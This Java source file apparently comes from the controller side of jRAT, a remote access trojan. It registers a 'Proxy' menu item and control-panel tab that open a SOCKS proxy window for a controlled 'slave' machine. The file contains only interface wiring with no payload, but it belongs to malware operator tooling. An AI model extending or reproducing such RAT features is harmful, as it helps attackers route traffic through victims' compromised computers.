package jrat.module.socks;

import jrat.api.ClientEventListener;
import jrat.api.ControllerModule;
import jrat.api.Resources;
import jrat.api.ui.ClientMenu;
import jrat.api.ui.ClientMenuItem;
import jrat.api.ui.ControlPanel;
import jrat.api.ui.ControlPanelTab;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.module.socks.ui.FrameSocks;


public class SocksControllerModule extends ControllerModule {
    
    public void init() throws Exception {
        menuItems.add(new ClientMenuItem(ClientMenu.Category.QUICK_OPEN,"Proxy", Resources.getIcon("proxy"), new ClientEventListener() {
            @Override
            public void emit(AbstractSlave slave) {
                new FrameSocks((Slave) slave).displayFrame();
            }
        }));

        controlPanelItems.add(new ControlPanelTab(ControlPanel.Category.SYSTEM, "Proxy", Resources.getIcon("proxy"), FrameSocks.class));
    }
}
